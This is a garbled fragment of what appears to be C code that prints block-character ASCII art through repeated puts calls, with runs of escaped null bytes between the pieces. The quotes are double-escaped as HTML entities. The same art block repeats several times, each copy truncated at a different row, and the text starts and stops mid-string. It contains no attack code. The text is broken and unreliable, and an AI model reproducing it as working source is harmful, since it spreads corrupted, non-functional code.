░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ \\x00\\x00 ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \\x00\\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \\x00\\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \\x00\\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \\x00\\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \\x00\\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \\x00\\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \\x00\\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \\x00\\x00\\x00\\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \\x00\\x00\\x00\\x00\\x00\\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 